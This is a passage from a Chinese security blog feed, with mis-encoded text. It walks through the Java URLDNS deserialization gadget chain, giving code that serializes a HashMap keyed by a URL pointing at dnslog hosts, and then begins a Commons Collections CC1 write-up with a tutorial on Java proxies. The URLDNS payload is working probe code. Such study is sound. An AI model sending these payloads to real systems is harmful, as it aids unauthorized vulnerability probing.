src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214433315.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214433315.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬ç”¨dnslogè¯•ä¸€ä¸‹ï¼ˆè®°å¾—è¦åŠ åè®®ï¼Œæ„é€ å‡½æ•°ä¼ é€’åˆ°æœ€åä¸€ä¸ªä¼šè¿›è¡Œåˆ¤æ–­ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://845yoh.dnslog.cn&quot;</span>);</span><br><span class="line">    url.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214722789.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214722789.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®Œå…¨æ˜¯æ²¡é—®é¢˜</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214804868.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214804868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="é“¾æ¥åˆ°readObject"><a href="#é“¾æ¥åˆ°readObject" class="headerlink" title="é“¾æ¥åˆ°readObject"></a>é“¾æ¥åˆ°readObject</h3><p>è°ƒç”¨URL.hashCode()çš„åœ°æ–¹å¾ˆå¤š</p><p>å®˜æ–¹ç»™å‡ºçš„ä¸‹ä¸€æ­¥æ˜¯HashMap#hash()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213010355.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213010355.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ­£å¥½åœ¨HashMapçš„readObjecté‡Œè°ƒç”¨äº†hash()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213130350.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213130350.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯»ä¸€ä¸‹ä¸Šé¢é‚£å¼ å›¾æœ€åä¸€ä¸ªå¾ªç¯ï¼Œå¾ªç¯ä»mapä¸­è¯»å–keyå’Œvalueã€‚æˆ‘ä»¬æä¸€ä¸ªkeyä¸ºurlçš„mapå»ååºåˆ—åŒ–å°±è¡Œäº†ã€‚</p><p>æˆ‘ä»¬å…ˆåºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://icguiixgku.dgrh3.cn&quot;</span>);</span><br><span class="line"><span class="comment">//        url.hashCode();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        serialize(map);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°åªæ˜¯åºåˆ—åŒ–å°±è§¦å‘äº†DNSè¯·æ±‚ï¼ˆæˆ‘æ˜¯å¤ªåˆ€ä¾ ï¼Œæå‰é¢„çŸ¥äº†è¿™é‡Œä¼šDNSè¯·æ±‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174318915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174318915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å‘ç°åœ¨map.putçš„æ—¶å€™å°±è°ƒç”¨äº†ä¸€éhash</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174532780.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174532780.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™æ²¡é“ç†çš„ï¼Œè¿˜æ²¡æ‰“åˆ°åˆ«äººç”µè„‘ä¸Šï¼ŒDNSå¹³å°å°±æœ‰è¯·æ±‚äº†ï¼Œå½±å“åˆ¤æ–­ã€‚æˆ‘ä»¬å¾—è®©putä¸è§¦å‘dnsè¯·æ±‚</p><blockquote><p>è‡³äºä¸ºä»€ä¹ˆè¦é€šè¿‡åå°„ä¿®æ”¹URLç±»è€Œä¸æ˜¯HashMapç±»ï¼Œæ˜¯å› ä¸ºHashMapæœ¬èº«å¹¶æ²¡æœ‰æä¾›ç›´æ¥ä¿®æ”¹keyçš„æ–¹æ³•ã€‚è¿™æ˜¯å› ä¸ºMapæ¥å£çš„è®¾è®¡åŸåˆ™ä¹‹ä¸€å°±æ˜¯keyçš„ä¸å¯å˜æ€§ï¼Œä¸€æ—¦ä¸€ä¸ªé”®å€¼å¯¹è¢«æ”¾å…¥Mapä¸­ï¼Œå®ƒçš„é”®å°±ä¸èƒ½æ”¹å˜ã€‚å¦‚æœæ”¹å˜äº†keyï¼Œé‚£ä¹ˆMapå°±æ— æ³•å®šä½åˆ°åŸæ¥çš„æ¡ç›®ã€‚</p><p>å¦‚æœä½ éœ€è¦â€œä¿®æ”¹â€ä¸€ä¸ªHashMapä¸­çš„keyï¼Œå®é™…ä¸Šçš„æ“ä½œæµç¨‹æ˜¯ï¼šä½¿ç”¨remove()æ–¹æ³•ç§»é™¤æ—§çš„é”®å€¼å¯¹ã€‚ä½¿ç”¨put()æ–¹æ³•æ’å…¥æ–°çš„é”®å€¼å¯¹ã€‚</p><p>HashMapå†…é”®å€¼å¯¹ä»¥Nodeçš„å½¢å¼å­˜å‚¨ï¼Œé“¾è¡¨é“¾æ¥ï¼Œè¶…è¿‡ä¸€å®šé˜ˆå€¼è¿˜ä¼šå˜æˆçº¢é»‘æ ‘</p></blockquote><p>å†å€’å›æ¥çœ‹URL#hashCode()ï¼Œå¦‚æœhashCodeå€¼ä¸ä¸º-1ï¼Œåˆ™ç›´æ¥è¿”å›ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719191216794.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719191216794.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£æˆ‘ä»¬é€šè¿‡åå°„ï¼Œåœ¨putå‰æŠŠå€¼æ”¹ä¸ºä¸ç­‰äº-1ï¼Œputåæ”¹ä¸º-1</p><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c6lmkl.dnslog.cn&quot;</span>);</span><br><span class="line"><span class="comment">//        url.hashCode();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">0</span>);</span><br><span class="line">        map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(map);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨å°±ä¸ä¼šè¯¯æŠ¥äº†ã€‚ç”±äºDNSç¼“å­˜åˆ·æ–°æ—¶é—´çš„é—®é¢˜ï¼Œä½ éœ€è¦å¤šå‘å‡ æ¬¡åŒ…æˆ–è€…ç­‰ä¸€ä¼šå„¿å†è¿è¡Œã€‚</p><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c6lmkl.dnslog.cn&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    hashCode.set(url,<span class="number">0</span>);</span><br><span class="line">    map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">    hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">    serialize(map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´åº”è¯¥æ˜¯ä½œè€…ç¿»çœ‹URLè¿™ä¸ªä¸å¤–ç•Œé€šä¿¡çš„ç±»æ—¶å‘ç°çš„ã€‚æœ‰è¶…å¤šåœ°æ–¹éƒ½è°ƒç”¨çš„hashCodeï¼Œä»”ç»†ä¸€çœ‹hashCodeè¿›ä¸€æ­¥è¿›è¡Œäº†DNSè§£æã€‚è¿›ä¸€æ­¥å¯»æ‰¾readObjectè§¦å‘åˆ°hashCodeçš„é“¾å­ã€‚è€Œä¸æ˜¯ä½œè€…ä»InetAddresså¼€å§‹æ‰¾çš„ï¼Œåªæ˜¯æœ¬æ–‡æŒ‰é¡ºåºå¦‚æ­¤åˆ†æã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCé‡å¯ä¹‹åŸºäºåŠ¨æ€ä»£ç†æ„é€ çš„LazyMap CC1åŠåˆ©ç”¨äºŒæ¬¡ååºåˆ—åŒ–çš„ä¿®å¤</title>
      <link href="/2024/07/13/cc-chong-qi-zhi-ji-yu-dong-tai-dai-li-gou-zao-de-lazymap-ban-cc1/"/>
      <url>/2024/07/13/cc-chong-qi-zhi-ji-yu-dong-tai-dai-li-gou-zao-de-lazymap-ban-cc1/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡é¦–å‘äº<a href="https://www.freebuf.com/vuls/406123.html">https://www.freebuf.com/vuls/406123.html</a></p><p>å‰ç½®çŸ¥è¯†ï¼š</p><h2 id="JavaåŠ¨æ€ä»£ç†"><a href="#JavaåŠ¨æ€ä»£ç†" class="headerlink" title="JavaåŠ¨æ€ä»£ç†"></a>JavaåŠ¨æ€ä»£ç†</h2><h3 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h3><p>å‡è®¾ç°åœ¨æœ‰è¿™ä¹ˆä¸€ä¸ªéœ€æ±‚ï¼š</p><ul><li>åˆ›å»ºäº†ä¸€ä¸ªæ¥å£Aï¼Œé‡Œé¢æœ‰display()å‡½æ•°ã€select()å‡½æ•°ã€add()å‡½æ•°ï¼Œç±»AImplå®ç°äº†è¿™ä¸‰ä¸ªå‡½æ•°ï¼Œç±»AstaticProxyä½œä¸ºç±»AImplçš„æ—¥å¿—ç±»ï¼Œåœ¨AImplæ¯ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ‰“å°â€œè°ƒç”¨äº†displayå‡½æ•°â€ï¼Œè°ƒç”¨äº†â€selectå‡½æ•°â€â€¦ç±»ä¼¼å¯¹AImplè¿›è¡Œè£…é¥°</li></ul><p>å³å¦‚ä¸‹å®ç°ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ¥å£Ainterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Ainterface</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç±»AImple</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AImpl</span> <span class="keyword">implements</span> <span class="title class_">Ainterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;display&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;select&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AImplçš„æ—¥å¿—ç±»AstaticProxyï¼Œåœ¨AImplå®ä¾‹ä¸Šæ·»åŠ åŠŸèƒ½</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AstaticProxy</span> <span class="keyword">implements</span> <span class="title class_">Ainterface</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Ainterface aimpl;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AstaticProxy</span><span class="params">(Ainterface a)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.aimpl = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        aimpl.display();</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†display&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span>&#123;</span><br><span class="line">        aimpl.select();</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†select&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        aimpl.add();</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå°±å®Œæˆäº†ä¸€ä¸ªé™æ€ä»£ç†</p><p>åœ¨ä¸»å‡½æ•°ä¸­è¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AImpl</span>();</span><br><span class="line">        a.add();</span><br><span class="line">        a.display();</span><br><span class="line">        a.select();</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">aproxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AstaticProxy</span>(a);</span><br><span class="line">        aproxy.add();</span><br><span class="line">        aproxy.display();</span><br><span class="line">        aproxy.select();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711220409517.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711220409517.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™æ ·ä»£ç†ç±»AstaticProxyä¸­è¿›è¡Œçš„è¡Œä¸ºæ˜¯AImplå¤šä½™çš„ï¼Œä¸ä¼šå½±å“åŸæœ¬çš„AImplç±»ï¼Œè¿™å°±å«é™æ€ä»£ç†ã€‚</p><p>ä½ ä¹Ÿè§‚å¯Ÿåˆ°äº†ï¼Œä¸‰ä¸ªæ–¹æ³•æ‰“å°ï¼Œå°±è¦å†™ä¸‰éï¼Œè€Œä¸”æ˜¯é«˜åº¦é‡å¤çš„ä»£ç ï¼Œåˆæˆ–è€…æ˜¯è¦åœ¨æ¯ä¸ªå‡½æ•°å‰é¢åŠ åŒä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°ã€‚å¦‚æœç±»ä¼¼Mapæ¥å£ï¼Œæ–¹æ³•å¤šåˆ°ç¦»è°±ï¼Œä¹Ÿè¦å†—ä½™çš„å†™åå‡ éå—ï¼Ÿæ­¤æ—¶å°±æœ‰äº†åŠ¨æ€ä»£ç†ã€‚</p><h3 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h3><p>java.lang.reflectåŒ…ä¸‹çš„Proxyç±»å’ŒInvocationHandleræ¥å£ç»„åˆä½¿ç”¨å°±èƒ½åˆ›å»ºä¸€ä¸ªåŠ¨æ€ä»£ç†å®ä¾‹</p><p>ç°åœ¨è®©æˆ‘ä»¬èˆå¼ƒAstaticProxyç±»ï¼Œå°è¯•å†™AdynamicProxyçš„åŠ¨æ€ä»£ç†ç±»</p><p>è¿™ä¸ªä»£ç†ç±»éœ€è¦å®ç°InvocationHandleræ¥å£ï¼Œè¯¥æ¥å£å†…åªæœ‰ä¸€ä¸ªæ–¹æ³•éœ€è¦å®ç°ï¼Œå°±æ˜¯invoke</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711222419213.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711222419213.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨invokeå†…é‡å†™æˆ‘ä»¬éœ€è¦åœ¨æ¯ä¸ªæ–¹æ³•å†…æ·»åŠ çš„å†…å®¹ã€‚</p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å…ˆä¸ç”¨å…³å¿ƒæ€ä¹ˆè°ƒç”¨è¿™ä¸ªinvokeï¼ˆä¹Ÿå°±æ˜¯å¦‚ä½•ä¼ å‚ï¼‰ï¼Œåªéœ€è¦çŸ¥é“åœ¨invokeå†…æ€ä¹ˆä½¿ç”¨è¿™ä¸‰ä¸ªå‚æ•°ï¼ŒproxyæŒ‡ä»£ç†å¯¹è±¡æœ¬èº«ï¼Œå³new AdynamicProxyç”Ÿæˆçš„å¯¹è±¡ï¼Œmethodæ˜¯è°ƒç”¨çš„æ–¹æ³•ï¼Œå¦‚add()ï¼›argsæ˜¯è°ƒç”¨æ–¹æ³•ä¼ çš„å‚æ•°ï¼Œå¦‚add()æ— å‚æ–¹æ³•å°±æ˜¯nullã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åŠ¨æ€ä»£ç†ç±»AdynamicProxyï¼Œä»£ç†å®ç°äº†Ainterfaceçš„ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdynamicProxy</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Ainterface a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AdynamicProxy</span><span class="params">(Ainterface a)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(a, args);</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†&quot;</span>+methodName);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ä¸ªåŠ¨æ€ä»£ç†ç±»ï¼Œç”¨<code>Proxy.newProxyInstance</code>ç”Ÿæˆä»£ç†ç±»å¯¹è±¡ï¼Œçœ‹è¿™ä¸ªå‡½æ•°éœ€è¦çš„å‚æ•°ï¼š</p><p>ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¸€ä¸ªClassLoaderï¼Œé€šç”¨å†™æ³•<code>.class.getClassLoader()</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼ æ¥å£æ•°ç»„ï¼Œå¯ä»¥å†™<code>new Class[]&#123;Ainterface.class&#125;</code>ï¼Œä¹Ÿå¯ä»¥ç”¨é€šç”¨å†™æ³•<code>a.getClass().getInterfaces()</code>ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å®ç°äº†InvocationHandlerçš„ä»£ç†ç±»ï¼Œè¿™æ ·å°±ç”Ÿæˆäº†ä»£ç†ç±»å®ä¾‹ã€‚</p><p><strong>è°ƒç”¨ä»£ç†ç±»å®ä¾‹çš„æ–¹æ³•ï¼Œä¼šæ‰§è¡Œä»£ç†ç±»çš„invokeæ–¹æ³•ã€‚</strong>é€šè¿‡åå°„<code>Object result = method.invoke(a, args);</code>è°ƒç”¨äº†AImplçš„å¯¹åº”æ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110500610.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110500610.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AImpl</span>();</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">aproxy</span> <span class="operator">=</span> (Ainterface) Proxy.newProxyInstance(Ainterface.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Ainterface.class&#125;, <span class="keyword">new</span> <span class="title class_">AdynamicProxy</span>(a));</span><br><span class="line">        aproxy.add();</span><br><span class="line">        aproxy.display();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110426076.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713110426076.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸”æˆ‘ä»¬çœ‹åˆ°Proxykå¯ä»¥åºåˆ—åŒ–ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714162202753.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714162202753.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="newProxyInstanceèƒŒåçš„é€»è¾‘"><a href="#newProxyInstanceèƒŒåçš„é€»è¾‘" class="headerlink" title="newProxyInstanceèƒŒåçš„é€»è¾‘"></a>newProxyInstanceèƒŒåçš„é€»è¾‘</h4><p>æˆ‘ä»¬åˆ†æä¸€ä¸‹newProxyInstanceæ€ä¹ˆåˆ›å»ºçš„åŠ¨æ€ä»£ç†å®ä¾‹ï¼Œæˆ‘ä»¬çš„åŠ¨æ€ä»£ç†ç±»AdynamicProxyé‡Œé¢åªæœ‰ä¸€ä¸ªæ„é€ å‡½æ•°å’Œinvokeæ–¹æ³•ï¼Œå½“ç„¶ä¸èƒ½ç›´æ¥newç”Ÿæˆã€‚è¿™ä¸ªåŠ¨æ€ä»£ç†å®ä¾‹å®é™…çš„è£…é…è¿‡ç¨‹å°±åœ¨newProxyInstanceã€‚</p><p>è¯¥å‡½æ•°å†…å¤§å¤šæ•°ä»£ç 